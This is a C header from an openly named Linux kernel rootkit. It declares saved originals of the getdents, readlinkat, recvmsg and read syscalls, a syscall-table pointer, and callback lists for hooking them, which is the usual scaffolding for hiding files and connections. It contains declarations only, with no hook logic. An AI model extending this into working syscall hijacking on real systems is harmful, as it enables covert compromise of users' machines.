#ifndef __ROOTKIT_CORE__
#define __ROOTKIT_CORE__

#include <linux/module.h>
#include <linux/syscalls.h>		/* Needed for __NR_recvmsg */
#include <linux/inet_diag.h>	/* Needed for ntohs */
#include <linux/socket.h>
#include <linux/list.h>

#include "sysmap.h"

struct user_msghdr;

struct orig {
	asmlinkage int (*getdents_syscall)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
	asmlinkage long (*readlinkat_syscall)(int dfd, const char __user *path, char __user *buf, int bufsiz);
	asmlinkage ssize_t (*recvmsg_syscall)(int sockfd, struct user_msghdr __user *msg, unsigned flags);
	asmlinkage long (*read_syscall)(unsigned int fd, char __user *buf, size_t count);
};

struct read_syscall_instrumenter {
	asmlinkage long (*callback)(unsigned int fd, char __user *buf, size_t count, long ret);
	struct list_head list;
};

struct getdents_syscall_instrumenter {
	asmlinkage int (*callback)(unsigned int fd, struct linux_dirent *dirp, unsigned int count, int ret);
	struct list_head list;
};

struct readlinkat_syscall_instrumenter {
	asmlinkage long (*callback)(int dfd, const char __user *path, char __user *buf, int bufsiz, long ret);
	struct list_head list;
};

struct rootkit_data {
	void **syscall_table;

	/* Saved syscalls */
	struct orig original_syscalls;
	struct list_head read_syscall_instrumenters;
};


#define MSG_PREF(module_name) \
	module_name": "

void register_read_instrumenter(asmlinkage long (*callback)(unsigned int fd, char __user *buf, size_t count, long ret));

void deregister_read_instrumenter(asmlinkage long (*callback)(unsigned int fd, char __user *buf, size_t count, long ret));

//static asmlinkage long my_read_syscall(unsigned int fd, char __user *buf, size_t count);

#endif
